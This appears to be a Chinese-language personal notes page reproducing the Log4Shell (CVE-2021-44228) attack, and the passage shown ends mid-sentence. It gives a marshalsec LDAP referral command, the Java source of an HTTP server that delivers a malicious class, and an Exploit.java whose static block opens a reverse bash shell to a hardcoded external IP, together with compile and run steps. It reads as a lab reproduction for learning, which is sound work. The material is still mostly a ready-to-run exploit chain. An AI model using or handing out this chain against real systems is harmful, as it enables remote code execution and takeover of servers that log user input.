<!doctype html><html lang=zh-Hant dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Security/log4j" data-has-hydrated=false><meta charset=UTF-8><meta name=generator content="Docusaurus v3.8.1"><title data-rh=true>[CVE-2021-44228] log4j 漏洞復現</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"><meta data-rh=true name=twitter:card content=summary_large_image><meta data-rh=true property=og:image content=https://RulerChen.github.io/RulerChen-Website/img/profile/profile.webp><meta data-rh=true name=twitter:image content=https://RulerChen.github.io/RulerChen-Website/img/profile/profile.webp><meta data-rh=true property=og:url content=https://RulerChen.github.io/RulerChen-Website/docs/Security/log4j/><meta data-rh=true property=og:locale content=zh_Hant><meta data-rh=true property=og:locale:alternate content=en><meta data-rh=true name=docusaurus_locale content=zh-Hant><meta data-rh=true name=docsearch:language content=zh-Hant><meta data-rh=true name=docusaurus_version content=current><meta data-rh=true name=docusaurus_tag content=docs-default-current><meta data-rh=true name=docsearch:version content=current><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current><meta data-rh=true property=og:title content="[CVE-2021-44228] log4j 漏洞復現 | RulerChen"><meta data-rh=true name=description content="CVE-2021-44228 log4j 漏洞復現"><meta data-rh=true property=og:description content="CVE-2021-44228 log4j 漏洞復現"><meta data-rh=true name=keywords content="CVE-2021-44228,log4j,log4j 漏洞"><link data-rh=true rel=icon href=/RulerChen-Website/img/profile/profile.webp><link data-rh=true rel=canonical href=https://RulerChen.github.io/RulerChen-Website/docs/Security/log4j/><link data-rh=true rel=alternate href=https://RulerChen.github.io/RulerChen-Website/docs/Security/log4j/ hreflang=zh-Hant><link data-rh=true rel=alternate href=https://RulerChen.github.io/RulerChen-Website/en/docs/Security/log4j/ hreflang=en><link data-rh=true rel=alternate href=https://RulerChen.github.io/RulerChen-Website/docs/Security/log4j/ hreflang=x-default><link data-rh=true rel=preconnect href=https://GSV9DQB5UM-dsn.algolia.net crossorigin=anonymous><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://RulerChen.github.io/RulerChen-Website/docs/Security/","name":"Security","position":1},{"@type":"ListItem","item":"https://RulerChen.github.io/RulerChen-Website/docs/Security/log4j","name":"[CVE-2021-44228] log4j 漏洞復現","position":2}]}</script><link rel=alternate type=application/rss+xml href=/RulerChen-Website/blog/rss.xml title="RulerChen RSS Feed"><link rel=alternate type=application/atom+xml href=/RulerChen-Website/blog/atom.xml title="RulerChen Atom Feed"><link rel=preconnect href=https://www.google-analytics.com><link rel=preconnect href=https://www.googletagmanager.com><script async src="https://www.googletagmanager.com/gtag/js?id=G-8BEHDPLQMG"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-8BEHDPLQMG",{anonymize_ip:!0})</script><link rel=search type=application/opensearchdescription+xml title=RulerChen href=/RulerChen-Website/opensearch.xml><meta name=google-site-verification content=QrdRbPEcOsJJ_kfRVewqfwR6GjPcRf0UVgRb85I-5fc><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css type=text/css integrity=sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM crossorigin=anonymous><link rel=stylesheet href=/RulerChen-Website/assets/css/styles.936c98c7.css><script src=/RulerChen-Website/assets/js/runtime~main.00fb9eff.js defer></script><script src=/RulerChen-Website/assets/js/main.67a340d7.js defer></script><body class=navigation-with-keyboard><svg xmlns=http://www.w3.org/2000/svg style="display: none;"><defs>
<symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark",e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/RulerChen-Website/img/profile/profile.webp><div role=region aria-label=跳至主要内容><a class=skipToContent_fXgn href=#__docusaurus_skipToContent_fallback>跳至主要内容</a></div><nav aria-label=主導航 class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label=切換導覽列 aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/RulerChen-Website/><div class=navbar__logo><img src=/RulerChen-Website/img/profile/profile.webp alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src=/RulerChen-Website/img/profile/profile.webp alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">RulerChen</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/RulerChen-Website/docs/intro/>Notes</a><a class="navbar__item navbar__link" href=/RulerChen-Website/blog/>Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link><svg viewBox="0 0 24 24" width=20 height=20 aria-hidden=true class=iconLanguage_nlXk><path fill=currentColor d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>繁體中文</a><ul class=dropdown__menu><li><a href=/RulerChen-Website/docs/Security/log4j/ target=_self rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang=zh-Hant>繁體中文</a><li><a href=/RulerChen-Website/en/docs/Security/log4j/ target=_self rel="noopener noreferrer" class=dropdown__link lang=en>English</a></ul></div><div class=navbarSearchContainer_Bca1><button type=button class="DocSearch DocSearch-Button" aria-label="搜尋 (Command+K)"><span class=DocSearch-Button-Container><svg width=20 height=20 class=DocSearch-Search-Icon viewBox="0 0 20 20" aria-hidden=true><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke=currentColor fill=none fill-rule=evenodd stroke-linecap=round stroke-linejoin=round /></svg><span class=DocSearch-Button-Placeholder>搜尋</span></span><span class=DocSearch-Button-Keys></span></button></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class=docsWrapper_hBAB><button aria-label=回到頂部 class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type=button></button><div class=docRoot_UBD9><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class=sidebarViewport_aRkj><div class=sidebar_njMd><nav aria-label=文件側邊欄 class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class=menu__link href=/RulerChen-Website/docs/intro/>Roadmap</a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="menu__link menu__link--sublist" href=/RulerChen-Website/docs/CMU15-445/>CMU 15-445/645</a><button aria-label="展開側邊欄分類 'CMU 15-445/645'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="menu__link menu__link--sublist menu__link--active" href=/RulerChen-Website/docs/Security/>Security</a><button aria-label="收起側邊欄分類 'Security'" aria-expanded=true type=button class="clean-btn menu__caret"></button></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/RulerChen-Website/docs/Security/log4j/>[CVE-2021-44228] log4j 漏洞復現</a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/RulerChen-Website/docs/Security/windowsservice/>如何使用 C# 創建惡意 Windows 服務來回彈系統權限的 shell</a></ul></ul></nav></div></div></aside><main class=docMainContainer_TBSr><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_z5aJ"><div class=docItemContainer_c0TR><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label=頁面路徑><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label=主頁面 class=breadcrumbs__link href=/RulerChen-Website/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_YNFT><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><a class=breadcrumbs__link href=/RulerChen-Website/docs/Security/><span>Security</span></a><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>[CVE-2021-44228] log4j 漏洞復現</span></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type=button class="clean-btn tocCollapsibleButton_TO0P">本頁導覽</button></div><div class="theme-doc-markdown markdown"><header><h1>[CVE-2021-44228] log4j 漏洞復現</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=概述>概述<a href=#概述 class=hash-link aria-label=概述的直接連結 title=概述的直接連結>​</a></h2>
<p>本文會在本地端 Windows 中的 docker 模擬一個含有漏洞的 log4j 環境，並且將攻擊用的 server 放在 gcp 上，最後回彈一個 shell 給攻擊者。</p>
<p>同時也提供了目標環境在 Windows (無 docker) 下的環境設定，以及如何回彈有 Admin 權限的 shell 的方法。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=雲端環境>雲端環境<a href=#雲端環境 class=hash-link aria-label=雲端環境的直接連結 title=雲端環境的直接連結>​</a></h2>
<p>在雲端的環境中，我們使用了三台 VM (實際上不需要這麼多，只是為了區分功能)，特別要注意的是有關防火牆的設定，有使用到的 port 記得都要開啟輸入 / 輸出的防火牆。</p>
<figure class=image-modal-container><img src=/RulerChen-Website/img/security/log4j/1.webp alt="" width=100% class=image-modal-thumbnail style=cursor:pointer loading=lazy><figcaption class=image-modal-caption>GCP Architecture</figcaption></figure>
<p>有另一點值得注意的是，我們在使用時都是使用本地 windows 的 powershell 來連線 gce，我在操作時發現使用 cloud shell 似乎沒辦法正常接收 reverse shell，建議如果有要進行操作的話可以在 Compute Engine -> 中繼資料 -> 安全殼層金鑰 中加入自己的金鑰來進行 ssh。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=ldap-主機架設>LDAP 主機架設<a href=#ldap-主機架設 class=hash-link aria-label="LDAP 主機架設的直接連結" title="LDAP 主機架設的直接連結">​</a></h2>
<p>在 LDAP 主機中，我們參考了 <a href=https://github.com/mbechler/marshalsec/tree/master target=_blank rel="noopener noreferrer">這篇 GitHub</a> 上的做法，並使用以下指令來執行 :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://35.221.253.187:8080/#Exploit</span><br></span></code></pre></div></div>
<p>將路徑指到放有惡意 class 的 server 上，再次強調必須開啟防火牆才能使用。</p>
<p>成功之後會出現以下訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">Listening on 0.0.0.0:1389</span><br></span></code></pre></div></div>
<p>收到指令後會出現以下訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">Send LDAP reference result for Exploit redirecting to http://35.221.253.187:8080/Exploit.class</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=惡意-class-主機架設>惡意 class 主機架設<a href=#惡意-class-主機架設 class=hash-link aria-label="惡意 class 主機架設的直接連結" title="惡意 class 主機架設的直接連結">​</a></h2>
<p>主要有兩個檔案 <code>DetailedHttpServer.java</code> 和 <code>Exploit.java</code>，分別是用來建立一個簡單的 http server 和設定 reverse bash (惡意檔案)。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>DetailedHttpServer.java</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.IOException;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.OutputStream;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.net.InetSocketAddress;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.time.LocalDateTime;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.time.format.DateTimeFormatter;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import com.sun.net.httpserver.HttpServer;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import com.sun.net.httpserver.HttpExchange;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">public class DetailedHttpServer {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    public static void main(String[] args) throws IOException {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        server.createContext("/", DetailedHttpServer::handleRequest);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        server.start();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Server started on port 8080");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    private static void handleRequest(HttpExchange exchange) throws IOException {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        String remoteAddress = exchange.getRemoteAddress().toString();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        String method = exchange.getRequestMethod();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        String path = exchange.getRequestURI().getPath();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("-------- New Request --------");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Time: " + timestamp);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Remote Address: " + remoteAddress);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Method: " + method);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Path: " + path);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("-----------------------------");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        try {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            byte[] response = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("Exploit.class"));</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            exchange.getResponseHeaders().set("Content-Type", "application/octet-stream");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            exchange.sendResponseHeaders(200, response.length);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            try (OutputStream os = exchange.getResponseBody()) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                os.write(response);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            System.out.println("File sent successfully.");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        } catch (IOException e) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String errorMessage = "File not found or error reading file.";</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            exchange.sendResponseHeaders(404, errorMessage.length());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            try (OutputStream os = exchange.getResponseBody()) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                os.write(errorMessage.getBytes());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            System.out.println("Error: " + errorMessage);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Request handled.");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">}</span></span><br></span></code></pre></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>Exploit.java</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.IOException;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">public class Exploit {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    static {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        try {</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String host = "104.199.254.153";</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            int port = 8000;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String[] command = {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "bash", "-c", String.format(</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    "bash -i >& /dev/tcp/%s/%d 0>&1",</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    host,</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    port</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                )</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            };</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            ProcessBuilder pb = new ProcessBuilder(command);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            pb.redirectErrorStream(true);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            Process process = pb.start();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            System.out.println("Reverse shell command executed.");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        } catch (IOException e) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            e.printStackTrace();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">}</span></span><br></span></code></pre></div></div>
<p>重要的是，受限於 log4j 的版本，我們需要使用舊版的 java 來進行編譯，指令如下 :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">sudo javac -source 1.8 -target 1.8 DetailedHttpServer.java</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">sudo javac -source 1.8 -target 1.8 Exploit.java</span><br></span></code></pre></div></div>
<p>接著啟動 http server :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">java DetailedHttpServer</span><br></span></code></pre></div></div>
<p>如果成功啟動會出現以下訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">Server started on port 8080</span><br></span></code></pre></div></div>
<p>如果有收到 request 會出現以下訊息 :</p>
